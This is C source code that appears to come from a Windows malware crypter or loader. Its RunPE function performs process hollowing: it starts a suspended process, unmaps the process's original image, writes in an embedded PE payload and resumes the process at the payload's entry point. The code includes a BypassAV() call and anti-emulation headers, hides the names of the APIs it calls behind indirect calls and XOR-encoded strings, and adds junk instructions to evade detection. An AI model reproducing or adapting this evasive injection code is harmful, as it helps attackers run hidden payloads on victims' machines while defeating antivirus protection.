#include <Windows.h>
#include <stdlib.h>
#include "noimport.h"
#include "define.h"
#include "antiemul.h"
#include "crypt.h"

#include "intrinsic.h"
 
typedef LONG (WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

/* Copies PE-image from given offset to memory */
LPVOID ShellcodeToMem(LPBYTE pCode, DWORD dwSize)
{
    //LPVOID pBuffer = niVirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	void *pBuffer = malloc(dwSize);
	__asm mov al, al;
	__asm nop;
	memcpy(pBuffer, pCode, dwSize);

    return pBuffer;
}
 
 /* Run PE-image in memory (process hollowing method) */
void RunPE(LPSTR szFilePath, LPVOID pFile)
{
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS NtHeader;
    PIMAGE_SECTION_HEADER Section;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    PCONTEXT ctx;
    PDWORD dwImageBase;
    NtUnmapViewOfSection xNtUnmapViewOfSection;
    LPVOID pImageBase;
    int Count;

	BypassAV();
 
    DosHeader = (PIMAGE_DOS_HEADER)pFile;
    if (DosHeader->e_magic == IMAGE_DOS_SIGNATURE)
    {
        NtHeader = (PIMAGE_NT_HEADERS)((DWORD)pFile + DosHeader->e_lfanew);
        if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
        {
            MemSet(&si, sizeof(si), 0);
            MemSet(&pi, sizeof(pi), 0);
 
            if (CallAPI(dwCreateProcessA, 10, szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
            {
                ctx = (PCONTEXT)VirtualAlloc(NULL, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE);
                ctx->ContextFlags = CONTEXT_FULL;
                if (CallAPI(dwGetThreadContext, 2, pi.hThread, (LPCONTEXT)ctx))
                {
                    CallAPI(dwReadProcessMemory, 5,pi.hProcess, (LPCVOID)(ctx->Ebx + 8), (LPVOID)&dwImageBase, 4, NULL);
                    if ((DWORD)dwImageBase == NtHeader->OptionalHeader.ImageBase)
                    {
						char ntdll[] = "\xfd\xe7\xf7\xff\xff\xbd\xf7\xff\xff\x00";
						char unmap[] = "\xdd\xe7\xc6\xfd\xfe\xf2\xe3\xc5\xfa\xf6\xe4\xdc\xf5\xc0\xf6\xf0\xe7\xfa\xfc\xfd\x00";
						
						XorBlock(ntdll, 9);
						XorBlock(unmap, 20);

                        xNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(ntdll), unmap);
						xNtUnmapViewOfSection(pi.hProcess, (PVOID)dwImageBase);
                    }
 
                    pImageBase = (LPVOID)CallAPI(dwVirtualAllocEx, 5, pi.hProcess, (LPVOID)NtHeader->OptionalHeader.ImageBase, NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
                    if (pImageBase)
                    {
                        CallAPI(dwWriteProcessMemory, 5, pi.hProcess, pImageBase, pFile, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
                        for (Count = 0; Count < NtHeader->FileHeader.NumberOfSections; Count++)
                        {
                            Section = (PIMAGE_SECTION_HEADER)((DWORD)pFile + DosHeader->e_lfanew + 248 + (Count * 40));
                            CallAPI(dwWriteProcessMemory, 5, pi.hProcess, (LPVOID)((DWORD)pImageBase + Section->VirtualAddress), (LPVOID)((DWORD)pFile + Section->PointerToRawData), Section->SizeOfRawData, NULL);   
                        }
                        CallAPI(dwWriteProcessMemory, 5, pi.hProcess, (LPVOID)(ctx->Ebx + 8), (LPVOID)&NtHeader->OptionalHeader.ImageBase, 4, NULL);
                        ctx->Eax = (DWORD)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
                        CallAPI(dwSetThreadContext, 2, pi.hThread, ctx);
                        CallAPI(dwResumeThread, 1, pi.hThread);
                    }
                }
            }
        }
    }
    CallAPI(dwVirtualFree, 3, pFile, 0, MEM_RELEASE);
}

